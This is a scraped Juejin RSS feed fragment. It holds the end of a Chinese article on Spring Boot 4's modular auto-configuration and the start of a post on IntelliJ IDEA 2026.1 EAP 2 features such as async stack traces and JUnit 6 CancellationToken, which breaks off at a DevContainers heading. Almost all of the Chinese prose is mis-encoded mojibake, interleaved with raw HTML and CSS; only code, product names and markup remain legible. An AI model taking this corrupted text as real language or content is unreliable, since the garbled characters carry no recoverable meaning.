<p>ä½†éšç€æ”¯æŒèŒƒå›´çš„æ‰©å¤§ï¼Œä¹Ÿå¸¦æ¥äº†å‡ ä¸ªé—®é¢˜ï¼š</p>
<ul>
<li><strong>è‡ƒè‚¿çš„è‡ªåŠ¨é…ç½®åŒ…</strong>ï¼šæ— è®ºæ˜¯å¦ä½¿ç”¨ï¼Œæ‰€æœ‰è‡ªåŠ¨é…ç½®ç±»éƒ½ä¼šè¢«æ‰“åŒ…è¿›åº”ç”¨ï¼›</li>
<li><strong>IDE æç¤ºå™ªéŸ³å¤š</strong>ï¼šä¼šå‡ºç°è®¸å¤šæ— å…³çš„ç±»å’Œé…ç½®å»ºè®®ï¼›</li>
<li><strong>å¯åŠ¨æ‰«æå¼€é”€å¤§</strong>ï¼šç±»è·¯å¾„è¶Šå¤§ï¼Œå¯åŠ¨é€Ÿåº¦è¶Šæ…¢ã€‚</li>
</ul>
<p>Spring å›¢é˜Ÿæ„è¯†åˆ°ï¼šè¦ä¿æŒ Spring Boot çš„â€œè½»é‡â€å’Œâ€œæ˜“ç”¨â€ï¼Œå°±å¿…é¡»é‡æ–°è®¾è®¡å…¶æ¶æ„è¾¹ç•Œï¼Œè¿™æ­£æ˜¯ Spring Boot 4 æ¨¡å—åŒ–çš„å‡ºå‘ç‚¹ã€‚</p>
<p>Spring Boot 4 å°†åŸå…ˆçš„å•ä½“å¼è‡ªåŠ¨é…ç½®åŒ…Â <strong>æ‹†åˆ†ä¸ºå¤šä¸ªç‹¬ç«‹æ¨¡å—</strong>ã€‚</p>
<p>æ¯ä¸ªæ¨¡å—ä»…è´Ÿè´£ä¸€ç§ç‰¹å®šæŠ€æœ¯çš„è‡ªåŠ¨é…ç½®ï¼Œä¾‹å¦‚ï¼š</p>





























<table><thead><tr><th>æ¨¡å—åç§°</th><th>åŠŸèƒ½æè¿°</th></tr></thead><tbody><tr><td><code>spring-boot-webmvc</code></td><td>ä¼ ç»Ÿ Servlet Web åº”ç”¨</td></tr><tr><td><code>spring-boot-webflux</code></td><td>å“åº”å¼ Web åº”ç”¨</td></tr><tr><td><code>spring-boot-data-jdbc</code></td><td>JDBC æ•°æ®è®¿é—®</td></tr><tr><td><code>spring-boot-flyway</code></td><td>æ•°æ®åº“è¿ç§»ç®¡ç†</td></tr><tr><td><code>spring-boot-webclient</code></td><td>ç‹¬ç«‹ WebClient æ”¯æŒ</td></tr></tbody></table>
<p>æ¯ä¸ªæ¨¡å—éƒ½æœ‰æ¸…æ™°çš„è¾¹ç•Œï¼ŒèŒè´£å•ä¸€ã€ä¾èµ–æ˜ç¡®ï¼Œä»è€Œè®©æ•´ä¸ªæ¡†æ¶å¯ç»´æŠ¤æ€§æ›´é«˜ã€‚</p>
<p>æ¨¡å—åŒ–å¸¦æ¥çš„å¥½å¤„æœ‰ï¼š</p>
<ol>
<li><strong>å¯ç»´æŠ¤æ€§æ›´é«˜ï¼š</strong> æ¨¡å—è¾¹ç•Œæ¸…æ™°ï¼Œå¼€å‘è€…å’Œè´¡çŒ®è€…å¯ä»¥æ›´ä¸“æ³¨äºç‰¹å®šæŠ€æœ¯é¢†åŸŸï¼ŒIDE ä¹Ÿèƒ½æä¾›æ›´ç²¾å‡†çš„ä»£ç æç¤ºã€‚</li>
<li><strong>å¯åŠ¨æ›´å¿«ã€å†…å­˜å ç”¨æ›´å°ï¼š</strong> åº”ç”¨åªå¼•å…¥æ‰€éœ€æ¨¡å—ï¼Œä¸å†åŠ è½½å†—ä½™åŠŸèƒ½ï¼Œå‡å°‘ç±»è·¯å¾„æ‰«æï¼Œä¼˜åŒ–å¯åŠ¨æ—¶é—´ä¸å†…å­˜å ç”¨ã€‚</li>
<li><strong>é…ç½®æ›´ç²¾å‡†ï¼š</strong> Spring Boot 4 èƒ½æ›´å‡†ç¡®åœ°è¯†åˆ«ä¾èµ–æ„å›¾ã€‚ ä¾‹å¦‚ï¼Œåªæƒ³ä½¿ç”¨Â <code>WebClient</code>Â æ—¶ï¼Œå¼•å…¥Â <code>spring-boot-webclient</code>Â æ¨¡å—å³å¯ï¼Œæ— éœ€å†å…³é—­ Web æœåŠ¡å™¨è‡ªåŠ¨é…ç½®ã€‚</li>
<li><strong>æ”¯æŒæ›´å¤šçµæ´»ç”¨ä¾‹ï¼š</strong> ä¾‹å¦‚ï¼Œ<code>Micrometer</code>Â ç›‘æ§æ¨¡å—å¯ä»¥ç‹¬ç«‹ä½¿ç”¨ï¼Œæ— éœ€å¼•å…¥å®Œæ•´çš„Â <code>Actuator</code>Â ä¾èµ–é“¾ã€‚</li>
</ol>
<p>æ¨¡å—åŒ–ä¸ä»…ä½“ç°åœ¨ä¸»åŠŸèƒ½ä¸Šï¼Œ<strong>æµ‹è¯•æ”¯æŒä¹Ÿéšä¹‹é‡æ„</strong>ã€‚</p>
<p>Spring Boot 4 æ–°å¢äº†æµ‹è¯•ä¸“ç”¨æ¨¡å—ï¼Œå¦‚ï¼š</p>
<ul>
<li><code>spring-boot-data-jdbc-test</code></li>
<li><code>spring-boot-starter-webmvc-test</code></li>
<li><code>spring-boot-starter-security-test</code></li>
<li><code>spring-boot-starter-flyway-test</code></li>
</ul>
<p>æ¯ä¸ªåŠŸèƒ½æ¨¡å—éƒ½æœ‰å¯¹åº”çš„æµ‹è¯• Starterï¼Œç¡®ä¿æµ‹è¯•ä¾èµ–å’Œç”Ÿäº§ä¾èµ–ä¿æŒä¸€è‡´ä¸”ç²¾ç®€ã€‚</p>
<p>å¦‚æœä½ æƒ³ä» Spring Boot 3 è¿ç§»åˆ° Spring Boot 4ï¼Œå¤§å¤šæ•°é¡¹ç›®åªéœ€è¦ï¼š</p>
<ul>
<li>æ›´æ–° Starter ä¾èµ–</li>
<li>æ·»åŠ æµ‹è¯• Starter</li>
<li>æ›´æ–°åŒ…è·¯å¾„ä¸è‡ªå®šä¹‰é…ç½®</li>
</ul>
<p>æ¨¡å—åŒ–åï¼ŒåŒ…è·¯å¾„è°ƒæ•´ä¸ºÂ <code>org.springframework.boot.&lt;module&gt;</code>ã€‚</p>
<p>å¦‚æœé¡¹ç›®ä¸­æœ‰æ‰‹åŠ¨å¯¼å…¥çš„è‡ªåŠ¨é…ç½®ç±»æˆ–è‡ªå®šä¹‰ Starterï¼Œéœ€è¦åŒæ­¥ä¿®æ”¹ã€‚</p>
<p>ä¸ºæ–¹ä¾¿è€é¡¹ç›®å¹³æ»‘è¿ç§»ï¼ŒSpring Boot 4 æä¾›äº†Â  <strong>â€œClassic Startersâ€</strong> ï¼š</p>
<pre><code class="hljs language-xml" lang="xml">
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
Â  Â Â <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
Â  Â Â <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-classic<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>è¯¥æ¨¡å¼ä¼šè‡ªåŠ¨å¼•å…¥æ‰€æœ‰æ¨¡å—çš„è‡ªåŠ¨é…ç½®ï¼Œä½†ä¸åŒ…å«æ–°çš„ä¾èµ–ç»“æ„ï¼Œé€‚åˆè¿‡æ¸¡é˜¶æ®µã€‚</p>
<p>å¼€å‘è€…å¯å…ˆè¿ç§»åˆ° Spring Boot 4 çš„ Classic æ¨¡å¼ï¼Œå†é€æ­¥ç²¾ç®€ä¸ºç‹¬ç«‹æ¨¡å—ã€‚</p>
<p>Spring Boot 4 çš„æ¨¡å—åŒ–ä¸ä»…è®©æ¡†æ¶å˜å¾—æ›´æ¸…æ™°ã€æ›´è½»é‡ï¼Œä¹Ÿè®©å¼€å‘ä½“éªŒæ›´è‡ªç„¶ã€æ›´é«˜æ•ˆã€‚</p>
<p>å¯¹äºæƒ³è¦æ„å»ºæ›´è½»ã€æ›´å¿«ã€æ›´å¯æ§çš„ä¼ä¸šçº§åº”ç”¨è€Œè¨€ï¼ŒSpring Boot 4 çš„æ¨¡å—åŒ–ï¼Œæ˜¯ä¸€åœºå€¼å¾—æŠ•å…¥çš„å‡çº§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[IntelliJ IDEA 2026.1 EAP 2 å‘å¸ƒï¼ŒClaude Code ä½“éªŒä¼˜åŒ–ï¼äººéº»äº†ã€‚]]></title>    <link>https://juejin.cn/post/7602901565033644078</link>    <guid>https://juejin.cn/post/7602901565033644078</guid>    <pubDate>2026-02-04T12:24:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602901565033644078" data-draft-id="7602811649126187059" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="IntelliJ IDEA 2026.1 EAP 2 å‘å¸ƒï¼ŒClaude Code ä½“éªŒä¼˜åŒ–ï¼äººéº»äº†ã€‚"/> <meta itemprop="keywords" content="åç«¯,Java"/> <meta itemprop="datePublished" content="2026-02-04T12:24:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JavaGuide"/> <meta itemprop="url" content="https://juejin.cn/user/166781497383294"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            IntelliJ IDEA 2026.1 EAP 2 å‘å¸ƒï¼ŒClaude Code ä½“éªŒä¼˜åŒ–ï¼äººéº»äº†ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/166781497383294/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JavaGuide
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T12:24:10.000Z" title="Wed Feb 04 2026 12:24:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯ Guideã€‚IntelliJ IDEA 2026.1 EAP 2 æ¥äº†ï¼è¿™æ¬¡æ›´æ–°å˜åŒ–ä¸å°â€”â€”Gradle Tooling API å‡çº§åˆ° 9.3.0ã€Java è°ƒè¯•å™¨æ–°å¢å¼‚æ­¥å †æ ˆè·Ÿè¸ªå¼€é”€æ£€æµ‹ã€Claude Code æ”¯æŒ Shift+Enter æ¢è¡Œã€JUnit 6 çš„ CancellationToken æ”¯æŒã€DevContainers å®¹å™¨åŒ–å¼€å‘å¢å¼ºã€‚</p>
<p>å’Œå¤§å®¶ä¸€æ ·ï¼Œç°æœ‰ Cursorã€Claude Codeã€ Codex ç­‰ AI ç¼–ç¨‹ IDE ä¹‹åï¼Œæˆ‘æ‰“å¼€ IDEA çš„é¢‘ç‡çœŸçš„å°‘å¤šäº†ã€‚ä¸è¿‡ï¼Œæˆ‘è¿˜æ˜¯ä¼šåœ¨ç”µè„‘è£…ä¸Šï¼Œå¹³æ—¶ CR æˆ–è€…è°ƒè¯•ç­‰åœºæ™¯è¿˜æ˜¯æ›´ç†Ÿæ‚‰ä¸€äº›ã€‚</p>
<p>å½“ä¸‹å»ä¸‹ç»“è®ºï¼Œè¯´è¿™æ¬¾é™ªä¼´äº†ç»å¤§éƒ¨åˆ† Java å¼€å‘è€…è¿™ä¹ˆå¤šå¹´çš„ IDE ä¼šèµ°å‘ç­äº¡ï¼ŒçœŸè¿˜ä¸å¤ªå¥½è¯´ï¼Œè¿™ä¸ªæ—¶ä»£ä¸€åˆ‡å‘å±•éƒ½å¿«äº†ï¼è¯´ä¸å®š IDEA åé¢åœ¨ AI æ–¹å‘å–å¾—äº†è¿›æ­¥å‘¢ï¼Ÿ</p>
<p>å¼€å§‹ä»‹ç»æœ¬æ¬¡å¸¦æ¥çš„ä¸»è¦æ›´æ–°ä¹‹å‰ï¼Œå…ˆç®€å•ä»‹ç»ä¸€ä¸‹ EAPã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯ EAPï¼Ÿ</h2>
<p><strong>EAPï¼ˆEarly Access Programï¼‰</strong> æ˜¯ JetBrains çš„æ—©æœŸè®¿é—®è®¡åˆ’ï¼Œæä¾›<strong>å…è´¹çš„å…¨åŠŸèƒ½é¢„è§ˆç‰ˆæœ¬</strong>ã€‚ä½ å¯ä»¥å°†å…¶è§†ä¸ºâ€œå®˜æ–¹å…¬æµ‹ç‰ˆâ€â€”â€”åŠŸèƒ½å®Œæ•´ä½†å¤„äºæ‰“ç£¨æœŸï¼Œé€‚åˆæƒ³æå‰å°é²œæˆ–å…è´¹ä½¿ç”¨æ­£ç‰ˆ IDE çš„å¼€å‘è€…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/20c9100bb0bf40d7aae693a6077ac9a6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770812652&amp;x-signature=kgIPiSi%2FSjxYi26QmKWoqnyQebA%3D" alt="" loading="lazy"/></p>
<p><strong>ä¸ºä»€ä¹ˆè¦å…³æ³¨ EAPï¼Ÿ</strong></p>
<ul>
<li><strong>å®Œå…¨å…è´¹</strong>ï¼šEAP ç‰ˆæœ¬åœ¨æœ‰æ•ˆæœŸå†…æ²¡æœ‰ä»»ä½•åŠŸèƒ½é™åˆ¶ã€‚</li>
<li><strong>æå‰ä½“éªŒæ–°ç‰¹æ€§</strong>ï¼šæ¯”æ­£å¼ç‰ˆæ—©å‡ ä¸ªæœˆç”¨ä¸Šç”Ÿäº§åŠ›å·¥å…·ã€‚</li>
<li><strong>å½±å“äº§å“æ–¹å‘</strong>ï¼šä½ çš„åé¦ˆå¯ä»¥ç›´æ¥æäº¤ç»™å¼€å‘è€…ï¼Œç”šè‡³å½±å“æœ€ç»ˆç‰ˆæœ¬çš„èµ°å‘ã€‚</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼šç”±äºæ˜¯ä¸ç¨³å®šç‰ˆæœ¬ï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®ä½¿ç”¨æ­£å¼ç‰ˆï¼›ä¸ªäººé¡¹ç›®æˆ–æŠ€æœ¯ç ”ç©¶å»ºè®®å°è¯• EAPã€‚</p>
<p>ä¸‹é¢å¸¦å¤§å®¶è¯¦ç»†çœ‹çœ‹è¿™æ¬¡æ›´æ–°ã€‚</p>
<h2 data-id="heading-1">Java è°ƒè¯•å™¨ä¼˜åŒ–</h2>
<p>å†™å¼‚æ­¥ä»£ç æœ€å¤´ç–¼çš„æ˜¯ä»€ä¹ˆï¼Ÿ<strong>è°ƒè¯•</strong>ã€‚</p>
<p>å½“ä½ ç”¨ <code>CompletableFuture</code>ã€Reactorã€RxJava è¿™äº›åº“å†™å¼‚æ­¥é€»è¾‘æ—¶ï¼Œå †æ ˆè·Ÿè¸ªä¼šå˜æˆä¸€ä¸² <code>lambda$xxx$xxx</code>ï¼Œçœ‹ä¸å‡ºä¸šåŠ¡é€»è¾‘åœ¨å“ªã€‚</p>
<p><strong>ä»€ä¹ˆæ˜¯å¼‚æ­¥å †æ ˆè·Ÿè¸ªï¼Ÿ</strong></p>
<p>ä¼ ç»Ÿå †æ ˆæ˜¯â€œç‰©ç†â€çš„ï¼Œè®°å½•çš„æ˜¯å½“å‰çº¿ç¨‹çš„è°ƒç”¨ã€‚è€Œå¼‚æ­¥ä»£ç ä¸­ï¼Œä»»åŠ¡ä¼šåœ¨ä¸åŒçº¿ç¨‹é—´ä¼ é€’ï¼Œå¯¼è‡´è°ƒç”¨é“¾æ–­è£‚ã€‚å¼‚æ­¥å †æ ˆè·Ÿè¸ªå°è¯•è¿˜åŸâ€œé€»è¾‘è°ƒç”¨é“¾â€ï¼Œè®©ä½ çœ‹åˆ°ä»»åŠ¡æ˜¯ä»å“ªé‡Œè¢«åˆ›å»ºå’Œè§¦å‘çš„ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ ç»Ÿä»£ç çš„å †æ ˆ</span>
Thread.run()
  â””â”€ service.process()
      â””â”€ repository.save()

<span class="hljs-comment">// å¼‚æ­¥ä»£ç çš„å †æ ˆï¼ˆä¼ ç»Ÿæ–¹å¼ï¼‰</span>
ForkJoinPool.run()
  â””â”€ lambda$asyncProcess$abc123
      â””â”€ CompletableFuture.apply()
          â””â”€ ?? ä¸šåŠ¡é€»è¾‘åœ¨å“ªï¼Ÿ
</code></pre>
<p><strong>å¼‚æ­¥å †æ ˆè·Ÿè¸ª</strong>å°è¯•è¿˜åŸ"é€»è¾‘è°ƒç”¨é“¾"ï¼Œè€Œä¸æ˜¯"ç‰©ç†çº¿ç¨‹æ ˆ"ï¼Œè®©å¼€å‘è€…èƒ½çœ‹åˆ°ä¸šåŠ¡ä»£ç çš„æ‰§è¡Œè·¯å¾„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/36daa702f4114fc9ab7cc4a30bdfd27b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770812652&amp;x-signature=uPCv0Z0dciGPdBYsNPoyoompIfo%3D" alt="åœ¨æ§åˆ¶å°ä¸­æ‰“å°çš„å¤±è´¥æµ‹è¯•çš„å¼‚æ­¥å †æ ˆè·Ÿè¸ª" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4119f26dad94da6bee533c36a819f5c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770812652&amp;x-signature=GLAz0UIBNcxLJLcDh5c81EPYq2o%3D" alt="è¿è¡Œé…ç½®å¯¹è¯æ¡†ä¸­çš„â€œæ‰“å°å¼‚å¸¸çš„å¼‚æ­¥å †æ ˆè·Ÿè¸ªâ€å¤é€‰æ¡†" loading="lazy"/></p>
<p>EAP 2 å¼•å…¥äº†<strong>å¼‚æ­¥å †æ ˆè·Ÿè¸ªå¼€é”€æ£€æµ‹</strong>ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆè¦æ£€æµ‹å¼€é”€ï¼Ÿ</strong></p>
<p>ç»´æŠ¤é€»è¾‘è°ƒç”¨å…³ç³»éœ€è¦é¢å¤–çš„å†…å­˜å’Œ CPU èµ„æºã€‚åœ¨æŸäº›æç«¯åœºæ™¯ä¸‹ï¼Œè¿™ç§ç›‘æ§æœ¬èº«å¯èƒ½æˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚æ–°ç‰¹æ€§ä¼šä¸»åŠ¨ç›‘æµ‹è°ƒè¯•å™¨çš„è¿è¡Œå¼€é”€ï¼Œå½“å‘ç°å…¶æ¶ˆè€—èµ„æºè¿‡å¤šæ—¶ä¼šåŠæ—¶æç¤ºã€‚è¿™èƒ½æœ‰æ•ˆé˜²æ­¢å¼€å‘è€…å› ä¸ºâ€œè°ƒè¯•å·¥å…·å¤ªé‡â€è€Œå¯¹åº”ç”¨æœ¬èº«çš„æ€§èƒ½äº§ç”Ÿè¯¯åˆ¤ã€‚</p>
<h2 data-id="heading-2">é€‚é… JUnit 6 æ–°ç‰¹æ€§</h2>
<p>JUnit 6.0.0 å·²ç»å‘å¸ƒï¼ŒIDEA 2026.1 EAP 2 å¯¹å…¶æ”¯æŒè¿›è¡Œäº†ä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-3">CancellationToken æ”¯æŒï¼ˆæ–°ç‰¹æ€§ï¼‰</h3>
<p>IDEA-382199ï¼š<strong>JUnit 6 æ”¯æŒ CancellationToken</strong>ã€‚</p>
<p><strong>JUnit 6 æœ‰å“ªäº›æ–°ç‰¹æ€§ï¼Ÿ</strong></p>
<p>JUnit 6 æ˜¯ä¸€æ¬¡é‡å¤§å‡çº§ï¼Œå…¶æ ¸å¿ƒå˜åŒ–åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>ç‰ˆæœ¬å·ç»Ÿä¸€</strong>ï¼šJUnit Platformã€Jupiter å’Œ Vintage ç°åœ¨ç»Ÿä¸€ä½¿ç”¨ 6.0.0 ç‰ˆæœ¬å·ã€‚</li>
<li><strong>åŸºçº¿æå‡</strong>ï¼šè¦æ±‚ <strong>Java 17+</strong> å’Œ <strong>Kotlin 2.2+</strong>ã€‚</li>
<li><strong>åŸç”Ÿæ”¯æŒ Kotlin æŒ‚èµ·å‡½æ•°</strong>ï¼šå¯ä»¥ç›´æ¥æµ‹è¯• <code>suspend</code> æ–¹æ³•ã€‚</li>
<li><strong>åä½œå¼å–æ¶ˆ</strong>ï¼šå¼•å…¥ CancellationToken APIã€‚</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/184a684db55c4258b55053e218faf58c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770812652&amp;x-signature=GpaNjV2pctW2HASoffmYdLszde4%3D" alt="" loading="lazy"/></p>
<p><strong>CancellationToken</strong> æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>å®ƒè®©æµ‹è¯•å¯ä»¥è¢«"ä¸»åŠ¨å–æ¶ˆ"ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// ä½ å¯åŠ¨äº† 1000 ä¸ªæµ‹è¯•</span>
<span class="hljs-comment">// è·‘åˆ°ç¬¬ 10 ä¸ªå‘ç°å…³é”® bugï¼Œæƒ³ç«‹å³åœæ­¢</span>
<span class="hljs-comment">// ä»¥å‰åªèƒ½æ‰‹åŠ¨ kill è¿›ç¨‹</span>
<span class="hljs-comment">// ç°åœ¨å¯ä»¥ç”¨ CancellationToken å–æ¶ˆå‰©ä½™æµ‹è¯•</span>
</code></pre>
<p>å¯¹ CI/CD åœºæ™¯å°¤å…¶æœ‰ç”¨â€”â€”å¿«é€Ÿåé¦ˆã€èŠ‚çœèµ„æºã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd51fdc5c75f42159041ec223857af6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YUd1aWRl:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770812652&amp;x-signature=xcZmvD6HEC03kHG9Xbb19wxy4%2Fk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-4">@FieldSource é™æ€åˆ†æä¿®å¤</h3>
<p>ä¿®å¤äº† JUnit 6 <code>@FieldSource</code> çš„é™æ€åˆ†æè¯¯æŠ¥ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">@<span class="hljs-built_in">FieldSource</span>(<span class="hljs-string">"testData.txt"</span>)
<span class="hljs-type">static</span> <span class="hljs-built_in">Stream</span>&lt;<span class="hljs-type">String</span>&gt; testData;

<span class="hljs-comment">// ä»¥å‰ï¼šIDE æŠ¥é”™ "Field source type must be convertible to a Stream"</span>
<span class="hljs-comment">// ç°åœ¨ï¼šæ­£ç¡®è¯†åˆ«ç±»å‹ï¼Œä¸å†è¯¯æŠ¥</span>
</code></pre>
<h2 data-id="heading-5">DevContainers å¢å¼º</h2>
